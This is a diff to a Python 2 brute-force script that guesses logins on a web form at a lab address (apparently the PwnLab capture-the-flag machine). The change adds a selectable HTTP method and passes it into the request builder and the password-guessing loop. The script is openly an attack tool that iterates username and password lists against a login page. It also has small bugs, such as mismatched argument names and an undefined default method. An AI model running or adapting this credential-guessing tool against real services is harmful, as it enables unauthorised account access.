@@ -21,14 +21,14 @@ def send_request(target, payload, response_size=4096):
     return response
 
 
-def create_http_request(path, host):
-    template = "POST /{} HTTP/1.1\r\nHost: {}\r\n" \
+def create_http_request(path, host, method="POST"):
+    template = "{} /{} HTTP/1.1\r\nHost: {}\r\n" \
                "Content-Type: application/x-www-form-urlencoded\r\n" \
-               "Content-Length: {}\r\n\r\n".format(path, host)
+               "Content-Length: {}\r\n\r\n".format(method, path, host)
     return template
 
 
-def single_try(user, passwd, counter):
+def single_try(user, passwd, method, counter):
     user = user.strip()
     passwd = passwd.strip()
     print "[*] Trying {}:{}... ({})".format(user, passwd, counter)
@@ -42,7 +42,7 @@ def single_try(user, passwd, counter):
     # pwnlab.connect(("192.168.1.2", 80))
     pwnlab = create_socket("192.168.1.2", 80)
 
-    req = create_http_request("?page=login", "192.168.1.2")
+    req = create_http_request("?page=login", "192.168.1.2", method)
     req += payload + "\r\n\r\n"
 
     # send request and check response
@@ -66,6 +66,8 @@ if __name__ == "__main__":
 
     parser.add_argument('-t', help='IP or URL of the target')
     parser.add_argument('-s', help='service to be attacked (HTTP, FTP, SSH)')
+    parser.add_argument('-m',
+                        help="additional parameter, eg . HTTP method (GET/POST)")
     parser.add_argument('-r', help='service TCP port')
     parser.add_argument('-e', help='error message to recognize failed attempt')
     parser.add_argument('-p', help='file with passwords list')
@@ -79,6 +81,8 @@ if __name__ == "__main__":
         usernames = open(args.U, "r").readlines()
     if args.p:
         passwords = open(args.P, "r").readlines()
+    if args.m:
+        method = args.m
     counter = 1
 
     if len(passwords) > 0 and len(usernames) > 0:
@@ -86,7 +90,7 @@ if __name__ == "__main__":
             len(usernames) * len(passwords))
         for user in usernames:
             for passwd in passwords:
-                single_try(user, passwd, counter)
+                single_try(user, passwd, method, counter)
                 counter += 1
 
         print "[-] All done, valid credentials not found :("
